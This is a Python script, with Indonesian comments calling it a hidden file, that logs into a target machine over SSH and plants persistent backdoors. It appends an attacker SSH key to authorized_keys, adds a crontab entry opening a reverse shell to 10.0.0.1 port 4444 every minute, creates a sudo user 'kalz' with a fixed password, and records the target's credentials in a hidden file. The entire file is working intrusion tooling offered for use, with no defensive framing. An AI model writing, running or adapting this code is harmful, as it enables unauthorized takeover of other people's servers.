#!/usr/bin/env python3
# ini file tersembunyi, jangan commit ke github
import paramiko, os, socket, subprocess, time

def deploy_backdoor(host, user, pwd):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=pwd, timeout=5)
        # pasang authorized key
        key = "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...kalz_backdoor"
        client.exec_command(f"mkdir -p ~/.ssh && echo '{key}' >> ~/.ssh/authorized_keys")
        # pasang reverse shell di cron tiap menit
        client.exec_command("echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' >> /etc/crontab")
        # tambahkan user baru sebagai cadangan
        client.exec_command("useradd -m -s /bin/bash kalz && echo 'kalz:kalz123' | chpasswd && usermod -aG sudo kalz")
        client.close()
        with open("/tmp/.deployed", "a") as f:
            f.write(f"{host}|{user}|{pwd}|{time.ctime()}\n")
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    # jika dipanggil langsung, baca target dari argumen
    import sys
    if len(sys.argv) >= 4:
        deploy_backdoor(sys.argv[1], sys.argv[2], sys.argv[3])
